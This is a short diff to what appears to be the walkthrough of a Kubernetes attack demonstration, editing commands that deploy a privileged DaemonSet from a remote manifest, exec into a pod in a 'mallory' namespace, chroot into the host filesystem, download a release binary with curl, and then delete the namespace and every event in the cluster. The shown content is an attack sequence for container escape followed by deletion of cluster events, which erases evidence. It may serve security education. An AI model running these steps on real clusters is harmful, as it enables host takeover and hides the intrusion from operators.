@@ -185,7 +185,7 @@ EOF
 ./kubectl --kubeconfig=config apply -f https://raw.githubusercontent.com/handfields/go-rce-kubernetes/main/08-priv-daemonset-chroot.yaml
  
 # exec into pod
-./kubectl --kubeconfig=config exec $(./kubectl --kubeconfig=config get pods -o=jsonpath={.items[1].metadata.name}) -it /bin/bash
+./kubectl --kubeconfig=config exec $(./kubectl --kubeconfig=config get pods -o=jsonpath={.items[1].metadata.name} -n mallory) -n mallory -it /bin/bash
  
 # go to hostPath mount and change root (not required for nsenter)
 cd /host && chroot .
@@ -200,7 +200,7 @@ curl -L https://github.com/handfields/go-rce-kubernetes/releases/download/0.1.0/
 ```
 ./kubectl --kubeconfig=config delete ns mallory 
  
-./kubectl --kubeconfig=config delete events -A  
+./kubectl --kubeconfig=config delete events -A --all 
 ```
  
 # General security guidance
